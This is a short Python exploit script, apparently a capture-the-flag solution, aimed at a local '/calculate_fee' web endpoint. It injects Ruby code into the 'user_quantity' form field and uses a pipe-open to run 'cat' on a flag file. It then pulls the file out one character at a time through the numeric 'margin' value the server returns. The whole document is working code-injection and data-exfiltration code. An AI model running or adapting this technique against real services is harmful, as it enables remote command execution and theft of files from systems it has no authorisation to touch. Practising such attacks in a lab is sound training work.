import requests

url = "http://localhost:3000/calculate_fee"
length_payload = "1;a=open /|cat flag-*/.source;b=a.read;b=b.length"
flag_payload = "1;a=open /|cat flag-*/.source;b=a.read;b=b.slice {};b.ord"

data = {
    "user_leverage":1,
    "user_entry_price":1,
    "user_exit_price":2,
    "user_quantity": length_payload
    }

r = requests.post(url,data = data)
res = r.json()
length = int(float(res['margin']))
print("length: ",length)

flag=""
for i in range(length):
    data['user_quantity'] = flag_payload.format(i)
    res = requests.post(url,data=data).json()
    flag+=chr(int(float(res['margin'])))
print(flag)
